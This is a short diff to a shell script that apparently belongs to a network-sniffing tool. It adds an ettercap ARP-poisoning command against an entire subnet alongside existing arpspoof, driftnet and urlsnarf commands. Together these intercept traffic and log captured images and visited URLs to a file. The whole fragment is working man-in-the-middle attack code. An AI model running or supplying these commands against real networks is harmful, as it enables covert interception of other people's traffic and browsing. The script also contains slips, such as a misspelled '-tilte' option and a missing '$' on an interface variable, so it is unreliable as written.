@@ -478,7 +478,7 @@ cd capture-sniffing
    else
    cd ..
    fi
-xterm -title sniff1 -e arpspoof -i interfacesn -t $routeursn $ipsn | xterm -title sniffing -e "driftnet -i $interfacesn $ipsn >> capture-sniffing/$sniffcap.cap" | xterm -title sniff -e "urlsnarf -i $interfacesn $ipsn >> capture-sniffing/$sniffcap.cap"
+xterm -tilte arp-poisening -e ettercap -Tqi $interfacesn -M arp /// /// | xterm -title sniff1 -e arpspoof -i interfacesn -t $routeursn $ipsn | xterm -title sniffing -e "driftnet -i $interfacesn $ipsn >> capture-sniffing/$sniffcap.cap" | xterm -title sniff -e "urlsnarf -i $interfacesn $ipsn >> capture-sniffing/$sniffcap.cap"
 fi
 
 
